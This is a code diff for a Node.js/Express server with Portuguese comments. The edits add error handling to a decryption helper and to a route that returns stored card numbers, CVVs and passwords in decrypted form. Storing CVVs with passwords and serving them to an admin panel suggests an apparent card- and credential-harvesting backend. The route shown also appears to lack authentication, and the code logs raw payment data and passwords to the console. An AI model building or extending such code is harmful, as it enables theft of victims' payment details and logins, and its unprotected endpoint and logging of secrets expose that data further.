@@ -58,7 +58,7 @@ app.use(limiter);
 // Middleware to parse JSON bodies
 app.use(bodyParser.json());
 
-// Middleware de segurança com CSP (ajustado para incluir cdn.tailwindcss.com)
+// Middleware de segurança com CSP
 app.use((req, res, next) => {
     const proto = req.headers['x-forwarded-proto'] || req.protocol;
     if (proto !== 'https' && req.hostname !== 'localhost') {
@@ -246,11 +246,16 @@ function encrypt(text) {
 }
 
 function decrypt(encryptedText) {
-    const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
-    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
-    let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
-    decrypted += decipher.final('utf8');
-    return decrypted;
+    try {
+        const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
+        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
+        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
+        decrypted += decipher.final('utf8');
+        return decrypted;
+    } catch (decryptionError) {
+        console.error('Erro na descriptografia:', decryptionError.message, 'Dados:', encryptedText);
+        return null; // Retorna null em caso de falha para evitar crash
+    }
 }
 
 // Função para buscar número de contato
@@ -294,7 +299,7 @@ app.get('/admin', (req, res) => {
     }
 });
 
-// Rotas de dados (com depuração adicional)
+// Rotas de dados
 app.post('/api/temp-submit', validateToken, async (req, res) => {
     try {
         console.log('Recebendo dados temporários:', req.body);
@@ -362,13 +367,23 @@ app.get('/api/temp-data', async (req, res) => {
         const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
         console.log('Dados brutos do temp_data:', result.rows);
         const decryptedRows = result.rows.map(row => {
-            console.log('Descriptografando linha:', row);
-            return {
-                ...row,
-                card_number: row.card_number ? decrypt(row.card_number) : null,
-                cvv: row.cvv ? decrypt(row.cvv) : null,
-                password: row.password ? decrypt(row.password) : null
-            };
+            try {
+                console.log('Descriptografando linha:', row);
+                return {
+                    ...row,
+                    card_number: row.card_number ? decrypt(row.card_number) : null,
+                    cvv: row.cvv ? decrypt(row.cvv) : null,
+                    password: row.password ? decrypt(row.password) : null
+                };
+            } catch (decryptionError) {
+                console.error('Erro na descriptografia de linha:', decryptionError.message, 'Linha:', row);
+                return {
+                    ...row,
+                    card_number: null,
+                    cvv: null,
+                    password: null
+                };
+            }
         });
         console.log('Dados descriptografados:', decryptedRows);
         res.json(decryptedRows);
